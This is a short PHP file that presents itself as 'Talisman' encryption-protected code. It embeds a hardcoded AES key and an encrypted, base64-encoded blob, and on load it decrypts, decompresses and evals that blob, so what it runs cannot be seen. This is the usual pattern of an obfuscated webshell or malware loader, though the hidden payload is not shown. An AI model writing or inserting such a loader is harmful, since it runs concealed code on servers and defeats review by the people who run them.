<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k3320c = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p9acad = base64_decode('e46Y+jtY9q0lpqMTfjT0kWZpRENUUy9kTExodmtUY295TjFDWHlDMVhtRU10a005OXcrRGs5SzVkc1RObndqNGxOV2FXZWlmZzd1Z29Ha2VBa1hUR0pQSW9HSHpFb3czUHU3MThlUnFVZjl0NXFvcWRpWXhjdEczVVJFPQ==');
$ie2f39 = openssl_cipher_iv_length('aes-256-cbc');
$ve8b91 = substr($p9acad, 0, $ie2f39);
$cf3e53 = substr($p9acad, $ie2f39);
eval('?>'.gzinflate(openssl_decrypt($cf3e53, 'aes-256-cbc', $k3320c, 0, $ve8b91)));